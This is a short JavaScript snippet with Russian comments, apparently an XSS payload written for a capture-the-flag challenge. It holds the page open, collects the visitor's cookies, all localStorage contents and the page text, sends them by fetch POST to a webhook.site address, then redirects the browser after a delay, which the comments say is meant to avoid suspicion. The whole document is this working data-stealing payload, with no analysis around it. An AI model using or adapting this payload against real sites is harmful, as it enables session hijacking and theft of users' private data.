// Останавливаем редирект
history.pushState(null, null, location.href);

// Ждём 2 секунды перед выполнением, чтобы избежать мгновенного редиректа
setTimeout(function() {
    // Перехватываем куки
    var cookies = document.cookie;

    // Перехватываем localStorage (вдруг флаг там)
    var localData = JSON.stringify(localStorage);

    // Захватываем содержимое страницы (флаг может быть в HTML)
    var pageContent = document.body.innerText;

    // Отправляем всё на твой веб-хук
    fetch('https://webhook.site/22abf491-b9f9-4ba2-8277-bed043be3f14', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            cookies: cookies,
            localStorage: localData,
            pageContent: pageContent,
            url: window.location.href
        })
    });

    // Через 3 секунды перенаправляем обратно, чтобы не вызвать подозрений
    setTimeout(function() {
        window.location = "http://rickroll.wctfg.net/";
    }, 3000);
}, 2000);
